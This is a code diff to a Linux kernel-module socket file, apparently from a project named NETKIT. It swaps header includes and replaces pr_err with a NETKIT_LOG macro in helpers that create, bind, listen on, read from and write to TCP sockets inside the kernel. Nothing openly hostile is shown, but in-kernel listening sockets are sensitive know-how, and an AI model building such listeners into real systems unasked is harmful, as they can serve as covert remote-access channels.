@@ -4,7 +4,10 @@
 #include <linux/in.h>
 #include <linux/inet.h>
 
-#include "../sys/mem.h"
+#include "socket.h"
+
+#include "mem.h"
+#include "debug.h"
 
 __be32 inet_addr(const char *str)
 {
@@ -23,7 +26,7 @@ int socket_create(__be32 ip, short port_htons, struct socket **sk_out, struct so
 
 	err = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, sk_out);
     if (err != 0) {
-        pr_err("[!] failed to create socket: %d\n", err);
+        NETKIT_LOG("[!] failed to create socket: %d\n", err);
         return err;
     }
 
@@ -58,14 +61,14 @@ int socket_listen(struct socket *sk, struct sockaddr_in *addr)
     kzfree(addr, sizeof(*addr));
     if (retv < 0) 
     {
-        pr_err("[!] failed to bind socket: %d\n", retv);
+        NETKIT_LOG("[!] failed to bind socket: %d\n", retv);
         goto LAB_OUT;
     }
 
     retv = sk->ops->listen(sk, 10);
     if (retv < 0)
     {
-        pr_err("[!] failed to listen on socket (err: %d)\n", retv);
+        NETKIT_LOG("[!] failed to listen on socket (err: %d)\n", retv);
         goto LAB_OUT;
     }
 
@@ -86,14 +89,14 @@ int socket_read(struct socket *sk, u8 **res_buf, size_t *res_buflen)
     if (IS_ERR(tmp_buf))
         return PTR_ERR(tmp_buf);
 
-    pr_err("[*] tmp_buflen: %lu\n", TMP_BUFLEN);
+    NETKIT_LOG("[*] tmp_buflen: %lu\n", TMP_BUFLEN);
 
     memset(&msg, '\x00', sizeof(msg));
     vec.iov_base = tmp_buf;
     vec.iov_len = TMP_BUFLEN;
 
     count = kernel_recvmsg(sk, &msg, &vec, 1, TMP_BUFLEN, 0);
-    pr_err("[*] read %lu bytes\n", count);
+    NETKIT_LOG("[*] read %lu bytes\n", count);
     if (count < 0)
     {
         retv = count;
@@ -132,7 +135,7 @@ int socket_write(struct socket *sk, u8 *req_buf, size_t req_buflen)
 
     count = kernel_sendmsg(sk, &msg, &vec, 1, req_buflen);
     if (count < 0) {
-        pr_err("[!] sock_recvmsg() failed (err: %d)\n", count);
+        NETKIT_LOG("[!] sock_recvmsg() failed (err: %d)\n", count);
     }
 
     return count;
